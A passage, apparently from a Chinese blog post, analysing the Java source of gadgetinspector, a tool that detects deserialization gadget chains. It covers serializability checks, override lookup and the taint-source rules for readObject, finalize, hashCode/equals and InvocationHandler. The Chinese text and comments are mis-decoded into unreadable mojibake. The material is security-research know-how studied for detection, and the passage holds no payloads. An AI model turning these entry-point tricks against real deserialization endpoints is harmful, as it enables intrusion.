<span class="title function_">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">    ImplementationFinder <span class="title function_">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                                 Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span><br><span class="line"><span class="params">                                                 InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾æ±¡ç‚¹æº</span></span><br><span class="line">    SourceDiscovery <span class="title function_">getSourceDiscovery</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ConfigRepository"><a href="#2-ConfigRepository" class="headerlink" title="2. ConfigRepository"></a>2. ConfigRepository</h3><p>å®šä¹‰é…ç½®åˆ—è¡¨ï¼Œç”¨äºè¿”å›é…ç½®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigRepository</span> &#123;</span><br><span class="line">    <span class="comment">// é…ç½®åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;GIConfig&gt; ALL_CONFIGS = Collections.unmodifiableList(Arrays.asList(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">JavaDeserializationConfig</span>(),        <span class="comment">// Java åŸç”Ÿåºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">JacksonDeserializationConfig</span>(),     <span class="comment">// Jacksonï¼ˆJsonï¼‰</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XstreamDeserializationConfig</span>()));   <span class="comment">// XStreamï¼ˆXMLï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿”å›é…ç½®</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name é…ç½®åç§°</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> GIConfig <span class="title function_">getConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (GIConfig config : ALL_CONFIGS) &#123;</span><br><span class="line">            <span class="keyword">if</span> (config.getName().equals(name)) &#123;</span><br><span class="line">                <span class="keyword">return</span> config;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-GIConfig-æ¥å£å®ç°"><a href="#3-GIConfig-æ¥å£å®ç°" class="headerlink" title="3. GIConfig æ¥å£å®ç°"></a>3. GIConfig æ¥å£å®ç°</h3><p>JavaDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>jserial</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector&#x2F;javaserial&#x2F;SimpleSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector&#x2F;javaserial&#x2F;SimpleImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector&#x2F;javaserial&#x2F;SimpleSourceDiscovery</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaDeserializationConfig</span> <span class="keyword">implements</span> <span class="title class_">GIConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;jserial&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SerializableDecider <span class="title function_">getSerializableDecider</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap, InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ImplementationFinder <span class="title function_">getImplementationFinder</span><span class="params">(Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                                        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap,</span></span><br><span class="line"><span class="params">                                                        InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleImplementationFinder</span>(getSerializableDecider(methodMap, inheritanceMap), methodImplMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> SourceDiscovery <span class="title function_">getSourceDiscovery</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SimpleSourceDiscovery</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JacksonDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>jackson</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector&#x2F;jackson&#x2F;JacksonSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector&#x2F;jackson&#x2F;JacksonImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector&#x2F;jackson&#x2F;JacksonSourceDiscovery</li></ul><p>XstreamDeserializationConfig</p><ul><li>é…ç½®åç§°ï¼š<code>xstream</code></li><li>åºåˆ—åŒ–å†³ç­–è€…ï¼šgadgetinspector&#x2F;xstream&#x2F;XstreamSerializableDeciderã€gadgetinspector&#x2F;xstream&#x2F;CustomXstreamSerializableDecider</li><li>æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼šgadgetinspector&#x2F;javaserial&#x2F;SimpleImplementationFinder</li><li>æŸ¥æ‰¾æ±¡ç‚¹æºï¼šgadgetinspector&#x2F;javaserial&#x2F;SimpleSourceDiscovery</li></ul><h2 id="gadgetinspector-x2F-javaserial"><a href="#gadgetinspector-x2F-javaserial" class="headerlink" title="gadgetinspector&#x2F;javaserial"></a>gadgetinspector&#x2F;javaserial</h2><p>é’ˆå¯¹ Java åŸç”Ÿåºåˆ—åŒ–çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æ£€æµ‹å®ç°ã€‚</p><h3 id="1-SimpleSerializableDecider"><a href="#1-SimpleSerializableDecider" class="headerlink" title="1. SimpleSerializableDecider"></a>1. SimpleSerializableDecider</h3><p>å®ç° <code>SerializableDecider</code> æ¥å£ï¼Œåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleSerializableDecider</span> <span class="keyword">implements</span> <span class="title class_">SerializableDecider</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;ClassReference.Handle, Boolean&gt; cache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  <span class="comment">// ç¼“å­˜åˆ¤æ–­ç»“æœï¼Œç±»-&gt;æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> InheritanceMap inheritanceMap;    <span class="comment">// ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleSerializableDecider</span><span class="params">(InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.inheritanceMap = inheritanceMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦å¯ä»¥åºåˆ—åŒ–ï¼Œå¹¶å°†åˆ¤æ–­ç»“æœæ·»åŠ åˆ°ç¼“å­˜</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">apply</span><span class="params">(ClassReference.Handle handle)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">cached</span> <span class="operator">=</span> cache.get(handle);</span><br><span class="line">        <span class="keyword">if</span> (cached != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cached;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">result</span> <span class="operator">=</span> applyNoCache(handle);</span><br><span class="line"></span><br><span class="line">        cache.put(handle, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Boolean <span class="title function_">applyNoCache</span><span class="params">(ClassReference.Handle handle)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­ç±»æ˜¯å¦åœ¨é»‘åå•å†…</span></span><br><span class="line">        <span class="keyword">if</span> (isBlacklistedClass(handle)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­æ˜¯å¦æœ‰ç›´æ¥æˆ–é—´æ¥å®ç° java/io/Serializable åºåˆ—åŒ–æ¥å£</span></span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(handle, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/io/Serializable&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­ç±»æ˜¯å¦åœ¨é»‘åå•å†…</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz ç±»</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isBlacklistedClass</span><span class="params">(ClassReference.Handle clazz)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;com/google/common/collect/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Serialization of these classes has been disabled since clojure 1.9.0</span></span><br><span class="line">        <span class="comment">// https://github.com/clojure/clojure/commit/271674c9b484d798484d134a5ac40a6df15d3ac3</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().equals(<span class="string">&quot;clojure/core/proxy$clojure/lang/APersistentMap$ff19274a&quot;</span>)</span><br><span class="line">                || clazz.getName().equals(<span class="string">&quot;clojure/inspector/proxy$javax/swing/table/AbstractTableModel$ff19274a&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SimpleImplementationFinder"><a href="#2-SimpleImplementationFinder" class="headerlink" title="2. SimpleImplementationFinder"></a>2. SimpleImplementationFinder</h3><p>å®ç° <code>ImplementationFinder</code> æ¥å£ï¼Œè¿”å›ç›®æ ‡æ–¹æ³•çš„å¯åºåˆ—åŒ–é‡å†™æ–¹æ³•ï¼ˆåŒ…æ‹¬ç›®æ ‡æ–¹æ³•æœ¬èº«ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleImplementationFinder</span> <span class="keyword">implements</span> <span class="title class_">ImplementationFinder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap;   <span class="comment">// é‡å†™æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleImplementationFinder</span><span class="params">(SerializableDecider serializableDecider, Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">        <span class="built_in">this</span>.methodImplMap = methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target) &#123;</span><br><span class="line">        <span class="comment">// å­˜å‚¨å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; allImpls = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Assume that the target method is always available, even if not serializable; the target may just be a local</span></span><br><span class="line">        <span class="comment">// instance rather than something an attacker can control.</span></span><br><span class="line">        allImpls.add(target);   <span class="comment">// é»˜è®¤è®¤ä¸ºç›®æ ‡æ–¹æ³•å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†é‡å†™æ–¹æ³•</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; subClassImpls = methodImplMap.get(target);</span><br><span class="line">        <span class="keyword">if</span> (subClassImpls != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle subClassImpl : subClassImpls) &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">                <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(subClassImpl.getClassReference()))) &#123;</span><br><span class="line">                    allImpls.add(subClassImpl); <span class="comment">// æ·»åŠ åˆ° allImpls</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allImpls;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SimpleSourceDiscovery"><a href="#3-SimpleSourceDiscovery" class="headerlink" title="3. SimpleSourceDiscovery"></a>3. SimpleSourceDiscovery</h3><p>ç»§æ‰¿ <code>SourceDiscovery</code> æŠ½è±¡ç±»ï¼Œå®ç°å…·ä½“çš„æ±¡ç‚¹æºæŸ¥æ‰¾æ–¹æ³• <code>discover</code>ã€‚éå†ç±»ä¿¡æ¯å’Œæ–¹æ³•ä¿¡æ¯ï¼Œæ ¹æ®å®šä¹‰çš„ 5 æ¡è§„åˆ™æœç´¢æ±¡ç‚¹æºï¼š</p><ul><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ— å‚æ•° void ç±»å‹çš„ finalize æ–¹æ³•</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ¥å— ObjectInputStream ç±»å‹å‚æ•°çš„ void ç±»å‹çš„ readObject æ–¹æ³•</li><li>ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”ä¸º InvocationHandler çš„å­ç±»</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”æ–¹æ³•ä¸ºæ— å‚æ•° int ç±»å‹çš„ hashCode æ–¹æ³•æˆ–æ¥å— Object ç±»å‹å‚æ•°çš„ boolean ç±»å‹çš„ equals æ–¹æ³•</li><li>æ–¹æ³•æ‰€å±ç±»å¯ä»¥åºåˆ—åŒ–ï¼Œä¸”è¯¥ç±»ä¸º groovy Closure çš„å­ç±»ã€æ–¹æ³•ä¸º call æˆ– doCall</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title class_">SourceDiscovery</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                         InheritanceMap inheritanceMap)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…ï¼Œç”¨äºåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">SerializableDecider</span> <span class="variable">serializableDecider</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSerializableDecider</span>(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ finalize æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ‰€å±ç±»å®ç°äº† readObjectï¼Œåˆ™ä¼ å…¥çš„ ObjectInputStream å‚æ•°è¢«è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†ç±»</span></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œä¸”æ˜¯å¦ä¸º InvocationHandler çš„å­ç±»</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                <span class="comment">// ä½¿ç”¨ä»£ç†æ—¶ï¼Œä»»ä½•æ‰©å±• InvocationHandler çš„ç±»éƒ½è¢«è®¤ä¸ºå—æ±¡æŸ“</span></span><br><span class="line">                MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„ç±»ä¼¼ï¼ˆå¯ä»¥åˆå¹¶ï¼‰</span></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ hashCode æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„ï¼ˆæ³¨æ„æè¿°ç¬¦ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¦‚æœæ˜¯ equals æ–¹æ³•åˆ™è®¤ä¸ºæ˜¯å—æ±¡æŸ“çš„ï¼ˆæ³¨æ„æè¿°ç¬¦ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> <span class="title class_">Source</span>(method, <span class="number">0</span>));</span><br><span class="line">                    